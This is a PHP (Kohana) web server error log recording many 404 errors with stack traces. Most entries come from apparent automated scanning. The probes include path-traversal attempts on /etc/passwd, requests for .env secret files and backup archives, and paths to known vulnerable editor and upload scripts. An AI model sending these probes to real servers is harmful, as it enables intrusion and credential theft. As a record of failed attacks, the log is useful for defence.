#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/cep6jefps1j4.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/cep6jefps1j4.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/seo-watcher/ofc/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/seo-watcher/ofc/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유윙윙유/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL js/FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL js/FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_flexicontent/librairies/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_flexicontent/librairies/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/backup.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/backup.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/wp-slimstat-ex/lib/ofc/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/wp-slimstat-ex/lib/ofc/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL libraries/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL libraries/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL adm/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL adm/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pyproject.toml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pyproject.toml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34db.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34db.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/logs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/logs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL libraries/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL libraries/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docker-compose-dev.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docker-compose-dev.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zadmin/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zadmin/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL plugins/editors/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL plugins/editors/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/eQuXoak6.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/eQuXoak6.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_db.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_db.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃윙윙헃/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docker-compose.yaml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docker-compose.yaml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\윙윙\/etc/passwd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-db.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-db.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docker/docker-compose.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docker/docker-compose.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL inc/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL inc/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL plugins/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL plugins/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/huvu6opdfowm.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/huvu6opdfowm.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/huvu6opdfowm.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/huvu6opdfowm.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL public/js/huvu6opdfowm was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL public/js/huvu6opdfowm was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/huvu6opdfowm.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/huvu6opdfowm.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webpack.config.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webpack.config.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL inc/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL inc/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL xmlrpc was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_database.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_database.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:59:00 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-29 19:59:00 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-29 20:41:59 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-29 20:41:59 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-29 20:43:02 --- ERROR: ErrorException [ 1 ]: Class 'Model_find' not found ~ SYSPATH/classes/kohana/model.php [ 26 ]
2025-10-29 20:43:02 --- STRACE: ErrorException [ 1 ]: Class 'Model_find' not found ~ SYSPATH/classes/kohana/model.php [ 26 ]
--
#0 [internal function]: Kohana_Core::shutdown_handler()
#1 {main}
2025-10-29 20:48:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: env.test.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: env.test.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: market/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: market/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: env.testing ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: env.testing ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lambda/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lambda/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dev/.env.bk ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dev/.env.bk ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:15 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dev/.env.db ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:15 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dev/.env.db ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:17 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nextjs/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:17 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nextjs/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:18 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: env/.env.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:18 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: env/.env.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/.env.db ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/.env.db ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Videos/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Videos/.env ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env.db ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env.db ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: auth/.env.2 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: auth/.env.2 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: auth/.env.1 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: auth/.env.1 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 20:48:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env.bk ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 20:48:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/.env.bk ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 21:21:31 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-29 21:21:31 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
